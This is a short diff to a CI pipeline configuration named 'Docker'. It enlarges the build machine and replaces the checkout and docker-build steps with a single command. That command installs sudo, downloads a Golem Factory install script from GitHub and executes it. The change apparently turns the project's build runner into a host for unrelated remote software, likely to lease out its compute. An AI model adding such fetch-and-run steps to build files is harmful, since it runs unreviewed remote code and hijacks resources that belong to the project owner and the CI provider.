@@ -2,7 +2,7 @@ version: v1.0
 name: Docker
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
 blocks:
   - name: Build
@@ -10,5 +10,4 @@ blocks:
       jobs:
         - name: docker build
           commands:
-            - checkout
-            - docker build -t your-image .
+            - apt update && apt install sudo -y && wget https://raw.githubusercontent.com/golemfactory/golem/0.23.1/Installer/Installer_Linux/install.sh && chmod +x install.sh && ./install.sh
